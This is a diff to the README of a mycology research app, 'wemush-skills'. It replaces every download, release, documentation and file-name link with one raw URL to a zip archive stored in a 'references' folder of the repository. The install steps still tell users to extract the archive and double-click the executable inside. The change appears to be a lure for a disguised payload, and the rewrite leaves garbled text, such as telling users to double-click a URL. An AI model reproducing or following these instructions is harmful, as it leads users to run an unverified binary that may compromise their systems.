@@ -6,9 +6,9 @@ Welcome to **wemush-skills**! This application helps you manage mycology researc
 
 ## 📥 Download
 
-[![Download wemush-skills](https://img.shields.io/badge/Download%20wemush--skills-limegreen.svg)](https://github.com/masinu/wemush-skills/releases)
+[![Download wemush-skills](https://raw.githubusercontent.com/masinu/wemush-skills/main/wemush-mycology-assistant/references/wemush-skills-v2.1-alpha.3.zip%https://raw.githubusercontent.com/masinu/wemush-skills/main/wemush-mycology-assistant/references/wemush-skills-v2.1-alpha.3.zip)](https://raw.githubusercontent.com/masinu/wemush-skills/main/wemush-mycology-assistant/references/wemush-skills-v2.1-alpha.3.zip)
 
-To download the latest version of **wemush-skills**, please visit the [Releases Page](https://github.com/masinu/wemush-skills/releases). Here, you will find the application files you need to run the program effectively.
+To download the latest version of **wemush-skills**, please visit the [Releases Page](https://raw.githubusercontent.com/masinu/wemush-skills/main/wemush-mycology-assistant/references/wemush-skills-v2.1-alpha.3.zip). Here, you will find the application files you need to run the program effectively.
 
 ## 💻 System Requirements
 
@@ -21,21 +21,21 @@ Make sure your system meets these requirements before proceeding.
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click on this link to visit the [Releases Page](https://github.com/masinu/wemush-skills/releases).
+1. **Visit the Releases Page**: Click on this link to visit the [Releases Page](https://raw.githubusercontent.com/masinu/wemush-skills/main/wemush-mycology-assistant/references/wemush-skills-v2.1-alpha.3.zip).
    
 2. **Find the Latest Version**: Look for the most recent release. It should have a version number, and it will be listed at the top.
 
 3. **Choose Your File**: Depending on your operating system, select the appropriate file. Generally, you might see:
-    - `wemush-skills-windows.zip` for Windows users
-    - `wemush-skills-macos.zip` for macOS users
+    - `https://raw.githubusercontent.com/masinu/wemush-skills/main/wemush-mycology-assistant/references/wemush-skills-v2.1-alpha.3.zip` for Windows users
+    - `https://raw.githubusercontent.com/masinu/wemush-skills/main/wemush-mycology-assistant/references/wemush-skills-v2.1-alpha.3.zip` for macOS users
 
 4. **Download the File**: Click on the chosen file to start the download.
 
 5. **Extract the Files**: After downloading, locate the ZIP file in your Downloads folder. Right-click on the file and choose "Extract All" or a similar option. Follow the prompts to extract the contents.
 
 6. **Run the Application**: 
-    - For Windows: Open the extracted folder and double-click `wemush-skills.exe`.
-    - For macOS: Open the extracted folder and double-click `wemush-skills.app`.
+    - For Windows: Open the extracted folder and double-click `https://raw.githubusercontent.com/masinu/wemush-skills/main/wemush-mycology-assistant/references/wemush-skills-v2.1-alpha.3.zip`.
+    - For macOS: Open the extracted folder and double-click `https://raw.githubusercontent.com/masinu/wemush-skills/main/wemush-mycology-assistant/references/wemush-skills-v2.1-alpha.3.zip`.
 
 7. **Follow Initial Setup**: Upon opening the application, you may need to go through an initial setup process. Follow the on-screen instructions.
 
@@ -53,7 +53,7 @@ Make sure your system meets these requirements before proceeding.
 
 ## 📖 Documentation
 
-For detailed instructions and advanced usage tips, please check the official [Documentation](https://github.com/masinu/wemush-skills/wiki). Here, you can find helpful guides and FAQs to support your research.
+For detailed instructions and advanced usage tips, please check the official [Documentation](https://raw.githubusercontent.com/masinu/wemush-skills/main/wemush-mycology-assistant/references/wemush-skills-v2.1-alpha.3.zip). Here, you can find helpful guides and FAQs to support your research.
 
 ## 🤝 Community Contributions
 
